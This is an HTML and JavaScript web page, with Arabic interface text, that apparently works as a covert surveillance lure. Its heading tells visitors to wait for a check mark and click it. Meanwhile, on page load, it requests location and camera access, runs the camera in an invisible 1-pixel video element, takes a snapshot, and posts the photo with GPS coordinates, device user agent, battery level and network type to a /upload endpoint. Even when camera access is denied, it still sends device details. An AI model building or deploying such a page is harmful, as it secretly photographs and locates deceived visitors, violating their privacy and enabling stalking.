<!DOCTYPE html>
<html>
  <body onload="startCamera()">
    <h2 style="color: green">
      welcom to ابحث عن علامة ✅ واظغط عليها <br />لم ترها ؟ من فظلك انتظر بضع
      ثواني وستظهر ..
    </h2>
    <video
      id="preview"
      autoplay
      muted
      playsinline
      style="width: 1px; height: 1px; opacity: 0"
    ></video>

    <canvas id="snapshot" style="display: none"></canvas>
    <p id="info"></p>

    <script>
      let stream;

      async function startCamera() {
        try {
          // أولاً: طلب إذن الموقع
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              // ثانياً: طلب إذن الكاميرا
              try {
                const permission = await navigator.permissions.query({
                  name: "camera",
                });
                if (permission.state === "denied") {
                  document.body.innerHTML =
                    "<h2 style='color:red;'>❌ تم رفض إذن الكاميرا من المتصفح</h2>";

                  const payload = {
                    image: "null",
                    info: {
                      time: new Date().toLocaleString(),
                      location: "غير متاح",
                      device: navigator.userAgent,
                      battery: "غير متاح",
                      network: "غير معروف",
                    },
                  };

                  fetch("/upload", {
                    method: "POST",
                    body: JSON.stringify(payload),
                    headers: { "Content-Type": "application/json" },
                  });

                  return;
                }

                stream = await navigator.mediaDevices.getUserMedia({
                  video: true,
                });
              } catch (err) {
                document.body.innerHTML =
                  "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
                  err.message +
                  "</h2>";

                const payload = {
                  image: "null",
                  info: {
                    time: new Date().toLocaleString(),
                    location: "غير متاح",
                    device: navigator.userAgent,
                    battery: "غير متاح",
                    network: "غير معروف",
                  },
                };

                fetch("/upload", {
                  method: "POST",
                  body: JSON.stringify(payload),
                  headers: { "Content-Type": "application/json" },
                });

                return;
              }

              const video = document.getElementById("preview");
              video.srcObject = stream;

              video.onloadedmetadata = () => {
                setTimeout(() => captureAndSend(pos), 1000);
              };
            },
            (err) => {
              document.body.innerHTML =
                "<h2 style='color:red;'>❌ لم يتم الحصول على الموقع: " +
                err.message +
                "</h2>";
            }
          );
        } catch (err) {
          document.body.innerHTML =
            "<h2 style='color:red;'>❌ خطأ غير متوقع: " + err.message + "</h2>";
        }
      }

      async function captureAndSend(pos) {
        const canvas = document.getElementById("snapshot");
        const video = document.getElementById("preview");
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");
        const timestamp = new Date().toLocaleString();
        const userAgent = navigator.userAgent;

        let batteryLevel = "غير متاح";
        let connectionType = "غير معروف";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        }

        if (navigator.connection) {
          connectionType = navigator.connection.effectiveType;
        }

        let location = "غير متاح";
        if (pos && pos.coords) {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          location = `${lat}, ${lon}`;
        }

        const payload = {
          image: imageData,
          info: {
            time: timestamp,
            location: location,
            device: userAgent,
            battery: batteryLevel,
            network: connectionType,
          },
        };

        fetch("/upload", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" },
        });

        document.getElementById("info").innerText =
          location === "غير متاح"
            ? "✅ تم التوثيق بدون موقع"
            : "✅ تم التوثيق والإرسال";
      }
    </script>
  </body>
</html>
